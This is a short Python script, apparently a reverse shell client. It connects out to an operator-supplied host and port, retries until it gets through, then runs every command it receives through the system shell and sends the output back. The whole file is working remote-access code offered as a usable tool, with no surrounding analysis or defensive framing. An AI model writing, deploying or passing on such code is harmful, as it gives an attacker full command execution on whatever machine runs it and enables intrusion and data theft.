import os
import socket
import subprocess
import time
import sys

s = socket.socket()

def main(host, port):
    while True:
        try:
            s.connect((host, port))
            print("Connected")
            break
        except:
            print("Failed to connect!\nRetrying...")
            time.sleep(5)
    s.send(str.encode(str(os.getcwd()) + '> '))
    while True:
        data = s.recv(1024)
        if data[:2].decode("utf-8") == 'cd':
            os.chdir(data[3:].decode("utf-8"))
            s.send(str.encode(os.getcwd()))
        elif data == 'exit':
            break
        elif len(data) > 0:
            cmd = subprocess.Popen(data[:].decode("utf-8"), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            output_bytes = cmd.stdout.read() + cmd.stderr.read()
            output_str = str(output_bytes, "utf-8")
            s.send(str.encode(output_str + str(os.getcwd()) + '> '))
            print(output_bytes)


if __name__ == "__main__":
    args = sys.argv[1:]
    if args:
        try:
            Host = sys.argv[1]
            if len(Host.split('.')) != 4 and Host.lower() != 'localhost':
                print("Invalid Host entered! Enter valid Host e.g 192.168.1.1")
                exit()
            Port = sys.argv[2]
            try:
                Port = int(Port)
            except ValueError:
                print("Invalid Port entered!\nEnter valid Port e.g 8080")
                exit()
        except Exception as e:
            print("Error occured getting Host and Port!\n" + str(e))
            exit()
        main(Host, Port)
    else:
        print("Enter Host and Port!\ne.g python Client.py localhost 8080")
    s.close()